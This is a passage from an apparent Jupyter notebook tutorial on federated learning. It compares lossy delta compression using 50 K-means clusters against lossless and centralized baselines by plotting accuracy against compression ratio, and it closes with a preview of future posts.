plt.xlabel('Average Compression Ratio')
plt.ylabel('Final Accuracy')
plt.legend()
plt.show()

Now let's see if we can tune the number of K-means clusters to achieve a better result. Increasing the number of clusters should intuitively improve accuracy (as we are able to incorporate additional information). Let's increase this to 50 clusters and see what happens.

In [ ]:
flflow7 = DeltaCompressionFlow(model=Net(), rounds=2, compression=LossyCompression(n_clusters=50))
flflow7.runtime = updated_local_runtime
flflow7.run()

In [ ]:
x4 = np.average(flflow7.compression_ratio)
y4 = flflow7.aggregated_model_accuracy

plt.scatter(1,centralized_accuracy,c='black',label='Centralized',alpha=0.5)
plt.scatter(x1,y1,c='blue',label='Lossless Compression',alpha=0.5)
plt.scatter(x2,y2,c='red',label='Lossless Delta Compression',alpha=0.5)
plt.scatter(x3,y3,c='green',label='Lossy Delta Compression',alpha=0.5)
plt.xlabel('Average Compression Ratio')
plt.ylabel('Final Accuracy')
plt.scatter(x4,y4,c='purple',label='Lossy Delta Compression (50 K-means clusters)',alpha=0.5)
plt.legend()
plt.show()

Now that the number of clusters have increased, **the accuracy has increased to ~81%, while retaining a 4x reduction is memory footprint**. The accuracy is now roughly inline with the lossless compression applied to deltas!

# Next Steps
Now that you've gotten a peek into the practical considerations of federated learning framework internals. In subsequent posts, we'll begin building higher level abstractions that make use of the low level functionality implemented as part of these workflows. We will also go through how to take security to the next level by adding checks into transfered data types, and finally how to deploy these pieces on real hardware. Stay tuned!